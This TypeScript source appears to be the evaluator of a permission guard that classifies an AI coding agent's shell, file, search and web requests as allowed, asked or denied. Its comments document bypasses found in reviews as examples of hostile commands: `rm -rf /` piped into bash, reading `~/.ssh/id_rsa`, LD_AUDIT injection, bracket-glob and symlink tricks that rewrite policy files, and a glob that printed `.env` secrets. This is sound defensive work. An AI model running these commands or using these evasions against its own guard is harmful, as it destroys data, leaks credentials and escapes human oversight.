      const rawHeadAt = commandHeadIndex(rawMarked.map((t) => t.text));
      const rawHead = (rawMarked[rawHeadAt]?.text ?? '').replace(/^.*\//, '');
      const patternWords =
        PATTERN_FIRST_HEADS.has(rawHead) &&
        !rawMarked.some((t) => /^-[a-zA-Z]*[ef]$/.test(t.text) || /^--(regexp|file)=/.test(t.text))
          ? (rawMarked.find((t, i) => i > rawHeadAt && !t.text.startsWith('-'))?.text ?? '').split(/\s+/).filter(Boolean)
          : [];
      // A CONTAINER'S PATHS ARE THE IMAGE'S. A Dockerfile RUN line writes inside the image, not on the host, so
      // its path operands are not judged against the workspace; its COMMANDS still are, and so is anything the
      // analyzer could not READ, which is unreadable wherever it runs (exit review 8).
      // THE DIRECTORY A COMMAND RUNS IN IS `env.cwd`, NOT THE ONE THE SEGMENT STARTED IN. `git -C dir` and
      // `env -C dir` are read ABOVE and recorded on the environment, which is what every producer then uses —
      // but the path classification was still handed the OUTER directory, so `git -C control-plane checkout
      // HEAD~1 permissions/matchers.md` and `env -C control-plane tee permissions/matchers.md` rewrote the
      // policy that decides every later verdict, at ALLOW, while the same act with the path spelled out whole
      // was an absolute deny (exit review 9). One directory, one meaning, for producers and paths alike.
      // ...IN EVERY DIRECTORY THE SHELL MAY BE IN. With a conditional `cd` behind it the segment's relative paths mean
      // different files, and the strongest answer wins; a `-C` in play (env.cwd moved) already names the directory
      for (const dir of env.cwd === effectiveCwd ? [env.cwd, ...altDirs] : [env.cwd])
        for (const h of classifyShellPaths(
          table,
          ctx,
          norm,
          dir,
          patternWords,
          env.containerPaths === true,
          written,
          seg,
        ))
          hits.push(h);
    }
    // shell writes whose target token resolves under the EGO home trust stores are trust tampering wherever EGO_HOME is
    if (ctx.egoHome) {
      const head = tokenize(seg)[0] ?? '';
      if (WRITE_HEADS.has(head) || WRITE_HEADS.has(head.slice(head.lastIndexOf('/') + 1))) {
        // A COPY READS ITS SOURCE OPERANDS AND WRITES ONLY ITS LAST, and so does an install or an rsync: `cp
        // ~/.ego/trust/keys.json /tmp/keys-backup.json` reads a key out of the trust store, which is not tampering
        // with it. Every operand was judged as a write target (exit review 10). `mv` also REMOVES its source, so it
        // keeps them all; `ln` links to them and is judged where it is handled above.
        const opTokens = tokenize(withoutRedirections(seg)).slice(1);
        const bareIdx = opTokens.map((t, i) => (t.startsWith('-') ? -1 : i)).filter((i) => i >= 0);
        const copyLike = /^(cp|install|rsync|scp|ditto|gcp)$/.test(head.slice(head.lastIndexOf('/') + 1));
        const lastBare = bareIdx.length ? bareIdx[bareIdx.length - 1]! : -1;
        for (const [ti, tok] of opTokens.entries()) {
          if (!tok.includes('/') || /^-/.test(tok)) continue;
          if (copyLike && bareIdx.length >= 2 && ti !== lastBare && !opTokens.some((t) => /^(-t|--target-directory)/.test(t))) continue;
          const abs = canonicalPath(tok.replace(/^~(?=\/|$)/, homedir()));
          const home = canonicalPath(ctx.egoHome).split(sep).join('/');
          if (underTrustDir(abs.split(sep).join('/'), home)) {
            hits.push({
              capability: 'ego.trust.tamper',
              verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
              via: 'EGO_HOME trust store (shell write)',
              segment: seg,
              absolute: true,
            });
          }
        }
      }
    }
    // a shell redirection is a path-known write: classify its target like a Write tool call
    // A REDIRECTION INSIDE A CARRIED BODY IS STILL A REDIRECTION, and the carrier's quoting hides it from the
    // segment text: `sh -c "echo x > control-plan{e..e}/permissions/matrix.yaml"` keeps the braces quoted at
    // this level, where a real shell does not expand them either, and the INNER shell expands them for real.
    // The normalized forms are the command as that inner shell sees it — braces already expanded — so the
    // targets are collected from the segment AND from every normalization of it (self-attack on exit review 9).
    const redirTargets = new Set(redirectionTargets(seg));
    // ...but only the normalizations that UNWRAPPED something. For an ordinary command the normalized form is the same
    // words with their quoting removed, and a `>` that was quoted in `git commit -m "why > control-plane/x.md is
    // refused"` looks like an operator there (exit review 10)
    const dequoted = tokenize(seg).join(' ');
    for (const n of normalizeSegment(seg))
      if (n !== dequoted) for (const t of redirectionTargets(n)) redirTargets.add(t);
    for (const target of redirTargets) for (const baseDir of [effectiveCwd, ...altDirs]) {
      const expanded = expandHome(target, baseDir);
      // THE WHOLE METACHARACTER SET, not four fifths of it. Every other glob test in this file uses `[*?[{]`;
      // this one omitted the BRACKET, so `.[h]arness/runtime/decisions/d1.json` — a POSIX bracket expression
      // that both zsh and bash expand to the real directory — was resolved as a literal path that will never
      // exist, classified as an ordinary in-repo file, and ALLOWED. One character defeated every root-anchored
      // protected glob: `[c]ontrol-plane`, `[p]olicies`, `.[c]laude`, `.h[u]sky`, `[n]ode_modules`, `.[m]cp.json`
      // (exit review 10). The operand readers had it right all along, which is why `cp x [c]ontrol-plane/...`
      // reported a glob destination while the redirection form did not.
      if (expanded === null || /[$`*?[{]/.test(expanded)) {
        written.add('\0any'); // a file nobody can name was written
        hits.push({
          capability: 'command.unknown',
          verdict: verdictFor(table, ctx, 'command.unknown'),
          via: 'redirection to a dynamic path',
          segment: seg,
          absolute: false,
        });
        continue;
      }
      const abs = isAbsolute(expanded) ? expanded : resolve(baseDir, expanded);
      recordWrite(abs); // A4: a later unit resolving THIS file is now stale
      const h = classifyPath(table, ctx, 'Write', abs);
      hits.push({ ...h, via: `redirection > ${target} (${h.via})`, segment: seg });
    }
    // ...and what an input redirection READS is judged like any file the command names: `mysql < /tmp/payload` feeds the
    // client a script, `cat < ~/.ssh/id_rsa` prints a key
    for (const src of redirectionSources(seg))
      for (const baseDir of [effectiveCwd, ...altDirs]) {
        const expanded = expandHome(src, baseDir);
        if (expanded === null || /[$`*?[{]/.test(expanded)) {
          hits.push({
            capability: 'command.unknown',
            verdict: verdictFor(table, ctx, 'command.unknown'),
            via: 'input redirection from a dynamic path',
            segment: seg,
            absolute: false,
          });
          continue;
        }
        const r = classifyPath(table, ctx, 'Read', isAbsolute(expanded) ? expanded : resolve(baseDir, expanded));
        if (r.via.startsWith('matcher path') || r.capability.startsWith('fs.credential') || r.capability === 'fs.outside-workspace.read')
          hits.push({ ...r, via: `input redirection < ${src} (${r.via})`, segment: seg });
      }
    // and the write-ish commands, whose destination is an operand rather than a redirection
    // A SYMLINK CREATED EARLIER IN THIS COMMAND IS A SECOND NAME FOR ITS TARGET. `ln -s Makefile alias && cp evil.mk
    // alias && make all` writes `Makefile` through `alias`, but the ledger canonicalises a destination at the moment
    // it is recorded - and `alias` did not exist yet, so it stayed `alias` and `Makefile` looked untouched
    // (exit review 10). The link and its target are recorded as a pair, and a later write to the link is a write to
    // the target. Only the pair is recorded here, so `ln -s Makefile alias && make all` is not made stale by the ln.
    // the pairs that EARLIER segments recorded - taken before this segment adds its own, so the `ln` that creates a
    // link is not itself a write through it
    linkPairsNow = [...written].filter((w) => w.startsWith('\0link:')).map((w) => w.slice(6).split('\0->') as [string, string]);
    // THE WRITER IS FOUND WHERE THE COMMAND STARTS, not at the first word. `env cp evil/plan.mk sub && make -C sub
    // -f plan.mk` copies through a wrapper, and reading the raw head left the ledger empty, so the makefile the
    // next command read looked untouched (exit review 10, cross-product: every wrapper the corpus knows).
    for (const n of new Set([seg, ...normalizeSegment(seg)])) {
      const lnTokens = tokenize(n);
      const lh = commandHeadIndex(lnTokens);
      if ((lnTokens[lh] ?? '') === 'ln' && lnTokens.some((t) => /^-[a-zA-Z]*s/.test(t))) {
        const lnOps = lnTokens.slice(lh + 1).filter((t) => !t.startsWith('-'));
        if (lnOps.length >= 2) {
          const linkAbs = canonicalPath(isAbsolute(lnOps[lnOps.length - 1]!) ? lnOps[lnOps.length - 1]! : resolve(effectiveCwd, lnOps[lnOps.length - 1]!));
          const targetAbs = canonicalPath(isAbsolute(lnOps[0]!) ? lnOps[0]! : resolve(dirname(linkAbs), lnOps[0]!));
          written.add(`\0link:${linkAbs}\0->${targetAbs}`);
        }
      }
      for (const dir of [effectiveCwd, ...altDirs]) {
        for (const w of writtenPathOperands(n, dir)) {
          if (w === LEDGER_ANY) written.add('\0any');
          else recordWrite(w);
        }
      }
    }
    // a sed script's `w FILE` writes it whatever the operands say - read from the segment AS WRITTEN, where the script
    // is still one quoted word
    for (const dir of [effectiveCwd, ...altDirs])
      for (const f of sedWrittenFiles(seg, ctx, dir)) recordWrite(isAbsolute(f) ? f : resolve(dir, f));
    // an extraction or a recursive copy writes a set of files nobody enumerated, so nothing resolved after it in
    // this unit is provably fresh — the same wildcard the ledger already uses for an undetermined effect
    if ([seg, ...normalizeSegment(seg)].some(writesUnenumerably)) written.add('\0any');
    // a standalone assignment (`PATH=./bin:$PATH`, `export SHELL=…`) sets it for every LATER segment of this
    // shell, and a function or alias definition rebinds the name it declares
    // THE ASSIGNMENT IS FOUND WHERE THE COMMAND STARTS, not where the segment does. A shell keyword in front of
    // it — `if export PGHOST=prod-db… && psql …`, `do export …` — left the test looking at `if export PGHOST=…`,
    // so the variable never carried to the next segment and a production database was read as the local socket
    // (exit review 7, generated cross-product). Same statement as the normalizer's own prefix loop.
    let bare = seg.trim();
    for (;;) {
      const kw = /^(\S+)\s+/.exec(bare);
      if (kw && (PREFIX_KEYWORDS.has(kw[1]!) || /^(export|declare|typeset|local|readonly)$/.test(kw[1]!))) {
        bare = bare.slice(kw[0].length).trim();
        // `declare -x NAME=value` is `export NAME=value`: the builtin's own options come first
        bare = bare.replace(/^(-[a-zA-Z]+\s+)+/, '');
        continue;
      }
      break;
    }
    // EVERY WORD of a standalone assignment list is an assignment, quoted or not: `export A=1 PGHOST=prod-db`,
    // `export "PGHOST=prod-db"` and `declare -x A=1 B=2` each carry more than the one unquoted word the test accepted
    // (exit review 10, self-attack)
    const assignWords = tokenize(bare);
    if (assignWords.length > 0 && assignWords.every((w) => /^[A-Za-z_][A-Za-z0-9_]*=/.test(w))) {
      for (const w of assignWords) {
        Object.assign(carriedEnv, segmentEnvInputs(w + ' x'));
        // A STANDALONE `export NAME=value` IS THE SAME INJECTION AS THE LEADING FORM. `LD_AUDIT=./evil.so cmd`
        // emitted the marker and `export LD_AUDIT=./evil.so; cmd` did not, although it re-points every program
        // for the rest of the shell rather than for one command (exit review 10).
        const name = w.slice(0, w.indexOf('='));
        if (ENV_INJECT_RE.test(name) && envInjects(name, w))
          hits.push(
            ...classifyNormalized(table, ctx, compiled, `${MARK}env-inject ${name}`, { ...state, env }),
          );
      }
    }
    const decl = /^(?:alias\s+([A-Za-z_][\w.-]*)=|(?:function\s+)?([^\s()<>|&;'"$`]+)\s*\(\s*\)\s*\{)/.exec(seg.trim());
    if (decl && bindingIsProven) definedNames.set(decl[1] ?? decl[2]!, `the body defines ${decl[1] ?? decl[2]} before using it`);
    // TREE-STATE PROVENANCE: a checkout, reset, stash pop, merge, rebase or worktree switch replaces a
    // repository-determined, unenumerable set of files. The per-path ledger cannot express that, so the tree
    // itself stops being fresh and every later conclusion drawn from repository content is STALE.
    // tested against the NORMALIZED forms, not the raw text: `git -C dir checkout` and `git --git-dir=… checkout`
    // normalize to `git checkout`, and a regex over the raw segment missed every option that takes an argument
    if (normalizeSegment(seg).some((n) => TREE_CHANGING.test(n.trim()))) written.add(TREE_DIRTY);
    // A4 — a segment whose own effect could not be determined may have written ANY file, so nothing resolved after
    // it in this unit is provably fresh. This is what makes freshness a property rather than a list of writers.
    if (
      hits
        .slice(hitsBefore)
        .some(
          (h) =>
            OPACITY_CLASSES.has(h.capability) ||
            h.capability === 'command.ambient-unresolved' ||
            h.capability === 'command.interpreter-inline',
        )
    )
      written.add('\0any');
    // A PASS-THROUGH COPIES ITS INPUT TO ITS OUTPUT, so the literal survives it: `echo 'rm -rf /' | cat | bash`
    // runs the rm, and one identity stage was enough to defeat the edge entirely (exit review 5).
    if (!(stdinFrom !== null && PASS_THROUGH_RE.test(seg.trim()))) {
      // this stage's standard output is what a following piped stage would read — and when this stage is part of
      // a GROUP, so is every earlier stage of the same group
      if (stage.groupId !== undefined && stage.groupId === upstreamGroup) upstreamParts.push(seg);
      else {
        upstreamParts = [seg];
        upstreamGroup = stage.groupId;
      }
      upstream = upstreamParts.join('\n');
      upstreamBody =
        stage.heredocBody === undefined ? null : { body: stage.heredocBody, expanded: stage.heredocExpanded === true };
    }
  }
    }
  return hits;
}

export function classifyCommand(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  command: string,
): CapabilityHit[] {
  const bashMatchers = table.matchers.filter((m) => m.command && (m.tool === 'Bash' || m.tool === 'any'));
  const compiled: Array<{ m: CompiledMatcher; re: RegExp }> = bashMatchers.map((m) => ({
    m,
    re: new RegExp(m.command!, 'i'),
  }));
  // A3 — CONTEXT VERIFICATION MUST BE EARNED. `cwdVerified` used to default to true merely because a cwd string
  // existed, so every conclusion drawn from a relative path inherited a claim nobody had checked. The invocation
  // directory counts as proven only when it EXISTS and lies inside a registered repository root — the two facts
  // every relative resolution below actually depends on.
  const cwd = ctx.cwd ?? process.cwd();
  const cwdVerified = directoryExists(cwd) && repoRootFor(ctx, cwd) !== null;
  return analyzeSegments(table, ctx, compiled, [command], {
    depth: 0,
    seen: new Set(),
    env: baseEnvironment(cwd, cwdVerified),
  });
}

export function classifyUrl(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  url: string,
): CapabilityHit {
  let host = url;
  try {
    host = new URL(url).host;
  } catch {
    /* keep raw */
  }
  for (const m of table.matchers) {
    if (!m.url || (m.tool !== 'WebFetch' && m.tool !== 'any')) continue;
    if (new RegExp(m.url, 'i').test(host)) {
      return {
        capability: m.capability,
        verdict: verdictFor(table, ctx, m.capability),
        via: `matcher url /${m.url}/`,
        absolute: isAbsoluteCap(table, m.capability),
      };
    }
  }
  return {
    capability: 'network.unknown',
    verdict: verdictFor(table, ctx, 'network.unknown'),
    via: 'no url matcher',
    absolute: false,
  };
}

function applyGrants(hit: CapabilityHit, ctx: EvaluationContext): CapabilityHit {
  if (hit.verdict === 'ASK' && !hit.absolute && ctx.grants?.includes(hit.capability)) {
    return { ...hit, verdict: 'ALLOW', grantApplied: true };
  }
  return hit;
}

export function evaluate(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  req: ToolRequest,
): Evaluation {
  let hits: CapabilityHit[] = [];
  const tool = req.tool;
  if (tool === 'Bash' || tool === 'shell') {
    const command = typeof req.input['command'] === 'string' ? req.input['command'] : '';
    hits = classifyCommand(table, ctx, command);
  } else if (tool === 'Read') {
    const p = typeof req.input['file_path'] === 'string' ? req.input['file_path'] : '';
    if (p) hits = [classifyPath(table, ctx, 'Read', p)];
  } else if (tool === 'Grep' || tool === 'Glob' || tool === 'LS') {
    // search tools read file contents or names under a path: the path (default: the working directory) is a read, and a
    // pattern that names a credential store is judged like one
    const base =
      typeof req.input['path'] === 'string' && req.input['path']
        ? req.input['path']
        : (ctx.cwd ?? process.cwd());
    const expanded = expandHome(base) ?? base;
    hits = [classifyPath(table, ctx, 'Read', expanded)];
    const home = canonicalPath(homedir()).split(sep).join('/');
    const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(ctx.cwd ?? process.cwd(), expanded))
      .split(sep)
      .join('/');
    const pattern = typeof req.input['pattern'] === 'string' ? req.input['pattern'] : '';
    const glob = typeof req.input['glob'] === 'string' ? req.input['glob'] : '';
    // THE PATTERN DECIDES THE REACH, so the pattern is CANONICALISED and classified like any other path — the
    // same thing `pathTokens` already does for the shell side. Concatenating `abs + '/' + pattern` and testing
    // the raw string meant an absolute pattern (`/Users/me/.ssh/*`), a `../` pattern or a `~/` pattern could
    // never match the home prefix, so the guard was inert on the one operand it was written for: `Glob` with
    // `path: ~/.ssh` was DENY and `Glob` with `pattern: ~/.ssh/*` — the byte-identical reach — was ALLOW.
    const reach0 = tool === 'Glob' ? pattern : glob;
    // A GLOB IS READ THE WAY THE SEARCH TOOL READS IT: braces are alternatives that may hold a slash (`{.env,src/x}`),
    // and a backslash escapes (`.en\\v` is `.env`) - so each alternative is classified on its own, unescaped
    // (exit review 10, self-attack)
    const reaches = reach0
      ? expandBraces(reach0)
          .split(/\s+/)
          .filter(Boolean)
          .map((r) => unquoteShellWord(r))
      : [];
    for (const reach of reaches) {
      // the literal prefix, with the trailing separator removed: `~/.ssh/*` reaches `~/.ssh`, and a path matcher
      // written as `~/.ssh/**` does not match a string that still ends in a slash
      const cut = reach.search(/[*?[{]/);
      const rawLiteral = cut < 0 ? reach : reach.slice(0, cut);
      // `/**/…` has the literal prefix `/`; stripping its trailing slash collapsed it to `.` — the working
      // directory — so a pattern that reaches the whole filesystem read as an in-workspace search (exit review 2)
      const literal = rawLiteral === '/' ? '/' : rawLiteral.replace(/\/+$/, '') || '.';
      const home2 = expandHome(literal);
      const resolvedReach = canonicalPath(
        home2 !== null && isAbsolute(home2) ? home2 : resolve(abs, home2 ?? literal),
      );
      // a wildcard reads INSIDE the literal prefix, so the thing classified is the directory's CONTENTS: a path
      // matcher written as `~/.ssh/**` describes what is in it, not the directory entry itself
      // a pattern anchored at `/` or carrying a `..` segment is not bounded by its literal prefix: `/**/.ssh/*`
      // has the prefix `/` and reaches everything under it (exit review 2)
      // a `..` segment ANYWHERE in the pattern escapes the literal prefix wherever that prefix resolves, and a
      // root anchor is unbounded when the prefix is outside every registered root
      const unbounded =
        /(^|\/)\.\.(\/|$)/.test(reach) || (reach.startsWith('/') && repoRootFor(ctx, resolvedReach) === null);
      // classify what the prefix names FIRST: an unbounded reach must never REPLACE a stronger answer, and
      // `<home>/.ssh/*` is both unbounded and a credential store
      const byPath = classifyPath(table, ctx, 'Read', cut < 0 ? resolvedReach : resolvedReach + '/');
      const strongerThanOutside =
        byPath.via.startsWith('matcher path') || !byPath.capability.startsWith('fs.repo');
      const r =
        unbounded && !strongerThanOutside
          ? {
              capability: 'fs.outside-workspace.read',
              verdict: verdictFor(table, ctx, 'fs.outside-workspace.read'),
              via: 'the pattern is not bounded by a directory inside the workspace',
              absolute: false,
            }
          : byPath;
      // a reach that leaves every registered root is not the `fs.repo.read` the base claimed it was
      if (unbounded || r.via.startsWith('matcher path') || !r.capability.startsWith('fs.repo'))
        hits.push({ ...r, via: `${tool} pattern ${reach} (${r.via})` });
      // THE PREFIX IS NOT THE ONLY LITERAL PART OF A PATTERN. `**/.env` has NO literal prefix — it reaches the
      // workspace root, which is ordinary — while its literal TAIL names the file it will actually open, and an
      // explicit glob overrides both ripgrep's skip-hidden default and .gitignore. So `Grep` with
      // `glob: '**/.env'` and output_mode "content" PRINTED a credential file at ALLOW (exit review 9). The
      // tail is classified as the file it names, anywhere the pattern can reach.
      const tail = reach.split('/').filter(Boolean).pop() ?? '';
      if (tail && !/[*?[{]/.test(tail)) {
        const t = classifyPath(table, ctx, 'Read', canonicalPath(resolve(resolvedReach, tail)));
        if (t.verdict !== 'ALLOW') hits.push({ ...t, via: `${tool} pattern ${reach} names ${tail} (${t.via})` });
      } else if (tail && !/^[*?]+$/.test(tail)) {
        // ...AND A WILDCARD TAIL NAMES A SET. `**/.env*` opens `.env`, `.env.local` and `.env.production`, and the
        // literal test above skipped it because of the `*` (exit review 10). The set is checked against the names a
        // credential file is actually given, and the strongest answer for any member that matches is the answer.
        const re = tailGlobRegExp(tail);
        if (re)
          for (const name of SECRET_FILE_NAMES)
            if (re.test(name)) {
              const t = classifyPath(table, ctx, 'Read', canonicalPath(resolve(resolvedReach, name)));
              if (t.verdict !== 'ALLOW') {
                hits.push({ ...t, via: `${tool} pattern ${reach} reaches ${name} (${t.via})` });
                break;
              }
            }
      }
    }
    if (
      abs === home ||
      home.startsWith(abs + '/') ||
      abs === '/' ||
      reaches.some((r) => globCouldReachCredentials(abs + '/' + r)) ||
      (reaches.length === 0 && globCouldReachCredentials(abs + '/'))
    )
      hits.push({
        capability: 'fs.credential-store.read',
        verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
        via: `${tool} over ${base} can reach credential stores`,
        absolute: false,
      });
  } else if (tool === 'Write' || tool === 'Edit' || tool === 'MultiEdit' || tool === 'NotebookEdit') {
    const p =
      typeof req.input['file_path'] === 'string'
        ? req.input['file_path']
        : typeof req.input['notebook_path'] === 'string'
          ? req.input['notebook_path']
          : '';
    if (p) hits = [classifyPath(table, ctx, tool === 'Write' ? 'Write' : 'Edit', p)];
  } else if (tool === 'apply_patch') {
    const patch =
      typeof req.input['command'] === 'string'
        ? req.input['command']
        : typeof req.input['patch'] === 'string'
          ? req.input['patch']
          : '';
    // `*** Move to:` names the DESTINATION of a rename and was never classified: an unconditional, fully
    // attacker-controlled write to any path, at ALLOW (challenge finding 7)
    const paths = [...patch.matchAll(/^\*\*\* (?:(?:Update|Add|Delete) File|Move to): (.+)$/gm)].map((m) =>
      m[1]!.trim(),
    );
    if (paths.length === 0) {
      return {
        verdict: 'DENY',
        hits: [],
        reason: 'apply_patch with no parseable file headers is denied (paths must be known before execution)',
      };
    }
    hits = paths.map((p) => classifyPath(table, ctx, 'Write', p));
  } else if (tool === 'WebFetch' || tool === 'WebSearch') {
    const url = typeof req.input['url'] === 'string' ? req.input['url'] : '';
    if (url) hits = [classifyUrl(table, ctx, url)];
    else {
      // A search carries no url, but it is still public network egress. It reached ALLOW even in HIGH_ASSURANCE,
      // where `network.public-read` is DENY and egress control is a required containment control (challenge
      // finding 9). `allowed_domains` only FILTERS WHICH RESULTS COME BACK: the query text is still sent to the search
      // provider over the public internet, so a search "limited to localhost" is not localhost traffic (exit review 10)
      const domains = Array.isArray(req.input['allowed_domains'])
        ? (req.input['allowed_domains'] as unknown[]).map(String)
        : [];
      const capability = 'network.public-read';
      hits = [
        {
          capability,
          verdict: verdictFor(table, ctx, capability),
          via: domains.length
            ? `web search limited to ${domains.join(', ')}`
            : 'web search over the public internet',
          absolute: false,
        },
      ];
    }
  } else if (tool.startsWith('mcp__')) {
    // MCP: resolved by the trust file by the caller (mcp.ts); here only the unknown default applies
    hits = [
      {
        capability: 'mcp.unknown',
        verdict: verdictFor(table, ctx, 'mcp.unknown'),
        via: 'mcp trust not resolved',
        absolute: false,
      },
    ];
  }
  hits = hits.map((h) => applyGrants(h, ctx));
  if (hits.length === 0) {
    // NOTHING fell through to ALLOW any more. A tool the evaluator does not model, or a modelled tool whose
    // operand is missing or of an unexpected shape, is unknown capability — and on claude-code an `allow` is
    // rendered as `permissionDecision: "allow"`, which SUPPRESSES the host's own prompt. Returning ALLOW there was
    // strictly worse than saying nothing (challenge findings 8 and 13). `command.unknown` is ASK and its
    // description is "the host's own permission prompt decides".
    return {
      verdict: verdictFor(table, ctx, 'command.unknown'),
      hits,
      reason: `no governed operation could be resolved for tool "${tool}" (unmodelled tool, or a missing or unexpected operand); the host's own permission prompt decides`,
    };
  }
  const weight = (h: CapabilityHit) =>
    VERDICT_RANK[h.verdict] * 10 +
    (h.absolute ? 2 : table.capabilities[h.capability]?.lock === 'organization' ? 1 : 0);
  const decisive = hits.reduce((a, b) => (weight(b) > weight(a) ? b : a));
  const reason =
    decisive.verdict === 'DENY'
      ? `${decisive.capability} is DENY${decisive.absolute ? ' (absolute core deny)' : table.capabilities[decisive.capability]?.lock === 'organization' ? ' (organization-locked deny)' : ''} in profile ${ctx.profile}, mode ${ctx.mode} (${decisive.via}${decisive.segment ? `: ${decisive.segment}` : ''}${decisive.effectOf ? `; effect of ${decisive.effectOf}` : ''})`
      : decisive.verdict === 'ASK'
        ? `${decisive.capability} requires human approval in profile ${ctx.profile}, mode ${ctx.mode} (${decisive.via}${decisive.segment ? `: ${decisive.segment}` : ''}${decisive.effectOf ? `; effect of ${decisive.effectOf}` : ''})`
        : `allowed: ${hits.map((h) => h.capability + (h.grantApplied ? ' (granted)' : '')).join(', ')}`;
  return { verdict: decisive.verdict, hits, reason, decisive };
}
